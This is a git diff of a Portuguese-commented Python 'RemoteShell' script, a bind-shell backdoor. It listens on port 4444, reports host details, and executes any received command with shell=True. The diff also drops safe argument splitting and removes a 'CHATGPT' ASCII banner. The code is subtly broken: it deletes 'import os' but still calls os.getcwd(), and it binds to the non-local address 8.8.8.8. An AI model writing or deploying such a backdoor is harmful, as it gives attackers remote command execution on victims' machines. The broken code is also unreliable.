@@ -1,30 +1,15 @@
-import os
 import socket
 import subprocess
-import shlex
 import platform
-
-# Caminho do arquivo que você deseja verificar
-file_path = '/Sat-lite/.github/workflows/satellite.ini'
-
-# Verifica se o arquivo existe
-if not os.path.isfile(file_path):
-    # Comandos a serem executados se o arquivo não existir
-    print(f"Arquivo {file_path} não encontrado!")
-    # Adicione aqui os comandos que deseja executar
-else:
-    # Comandos a serem executados se o arquivo existir
-    print(f"Arquivo {file_path} encontrado!")
-    # Adicione aqui os comandos que deseja executar
 
 class RemoteShell:
     def __init__(self, port=4444):
         self.PORT = port
 
     def execute_command(self, command):
+        """Executa um comando no sistema e retorna a saída."""
         try:
-            command = shlex.split(command)
-            output = subprocess.check_output(command, stderr=subprocess.STDOUT)
+            output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
             return output.decode()
         except subprocess.CalledProcessError as e:
             return str(e)
@@ -32,6 +17,7 @@ class RemoteShell:
             return str(e)
 
     def get_system_info(self):
+        """Retorna informações do sistema."""
         try:
             system_info = f"System: {platform.system()} {platform.release()}\n"
             system_info += f"Node Name: {platform.node()}\n"
@@ -43,39 +29,34 @@ class RemoteShell:
             return str(e)
 
     def main(self):
-        print("Connecting back to the host machine...")
+        """Conecta ao host e aguarda comandos."""
+        print("Conectando ao host...")
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server.bind(('0.0.0.0', self.PORT))
+        server.bind(('8.8.8.8', self.PORT))  # Mudando o endereço para 8.8.8.8 (DNS do Google)
         server.listen(1)
+        print("Aguardando conexão na IP 8.8.8.8...")
         connection, address = server.accept()
+        print(f"Conexão recebida de {address}")
 
         with connection:
-            print("Connection successful")
-            hostname = socket.gethostname()
-            connection.send(f"Machine name: {hostname}\n".encode())
-            connection.send(f"Current directory: {os.getcwd()}\n".encode())
+            # Envia informações do sistema
+            connection.send("Conectado ao servidor remoto.\n".encode())
+            connection.send(f"Nome da máquina: {platform.node()}\n".encode())
+            connection.send(f"Diretório atual: {os.getcwd()}\n".encode())
 
             while True:
-                try:
-                    command = connection.recv(1024).decode()
-                    if command.strip().lower() == 'exit':
-                        break
-                    elif command.strip().lower() == 'system_info':
-                        system_info = self.get_system_info()
-                        connection.send(system_info.encode())
-                    else:
-                        output = self.execute_command(command)
-                        connection.send(output.encode())
-                except Exception as e:
-                    connection.send(f"Error: {e}\n".encode())
+                # Aguarda um comando para executar
+                command = connection.recv(1024).decode()
+                if command.strip().lower() == 'exit':
+                    break
+                elif command.strip().lower() == 'system_info':
+                    system_info = self.get_system_info()
+                    connection.send(system_info.encode())
+                else:
+                    output = self.execute_command(command)
+                    connection.send(output.encode())
 
 if __name__ == "__main__":
     remote_shell = RemoteShell()
     remote_shell.main()
-
-print("   CCCC  H   H    A   TTTTT  GGGG  PPPP  TTTTT")
-print("  C      H   H   A A    T   G      P   P   T")
-print("  C      HHHHH  AAAAA   T   G  GG  PPPP    T")
-print("  C      H   H  A   A   T   G   G  P       T")
-print("   CCCC  H   H  A   A   T    GGG   P       T")
-
+    
